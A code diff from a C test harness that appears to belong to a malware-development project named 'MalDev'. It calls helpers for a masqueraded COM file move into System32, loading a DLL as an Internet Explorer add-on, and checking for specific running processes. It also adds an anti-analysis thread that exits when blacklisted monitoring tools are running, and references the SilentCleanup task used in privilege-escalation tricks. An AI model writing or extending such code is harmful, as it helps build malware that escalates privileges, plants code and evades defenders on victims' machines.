@@ -557,7 +557,7 @@ void test27() {
 }
 
 void test28() {
-	MasqueradedMoveDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\ida.hexlic", L"C:\\Windows\\System32", FALSE);
+	MasqueradedMoveDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\a.txt", L"C:\\Windows\\System32", FALSE);
 }
 
 void test29()
@@ -656,6 +656,50 @@ void test29()
 	CoUninitialize();
 }
 
+void test30() {
+	PBYTE pBuffer = NULL;
+	DWORD cbBuffer = 0;
+
+	pBuffer = ReadFromFile(L"D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\TestDll1.dll", &cbBuffer);
+	IeAddOnInstallMethod(pBuffer, cbBuffer);
+	FREE(pBuffer);
+}
+
+void test31() {
+	LPWSTR List[] = {L"Zalo.exe", L"SystemInformer.exe", L"chrome.exe", L"steam.exe", L"wallpaper32.exe", L"SnippingTool.exe"};
+	BOOL Result = FALSE;
+
+	Result = AreProcessesRunning(List, _countof(List), 0);
+	wprintf(L"Result = %d\n", Result);
+}
+
+VOID DetectMonitorSystem() {
+	while (TRUE) {
+		if (CheckForBlackListProcess()) {
+			ExitProcess(-1);
+		}
+
+		Sleep(1000);
+	}
+}
+
+VOID TestFinal() {
+	HANDLE hThread = NULL;
+	DWORD dwThreadId = 0;
+
+	hThread = CreateThread(NULL, 0, DetectMonitorSystem, NULL, 0, &dwThreadId);
+	if (hThread == NULL) {
+		LogError(L"CreateThread failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		goto CLEANUP;
+	}
+
+
+CLEANUP:
+	if (hThread != NULL) {
+		CloseHandle(hThread);
+	}
+}
+
 int main() {
 	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
 	//test1();
@@ -683,7 +727,9 @@ int main() {
 	//test25();
 	//test26();
 	//test27();
-	test28();
+	//test28();
 	//test29();
+	//test30();
+	test31();
 	return 0;
 }
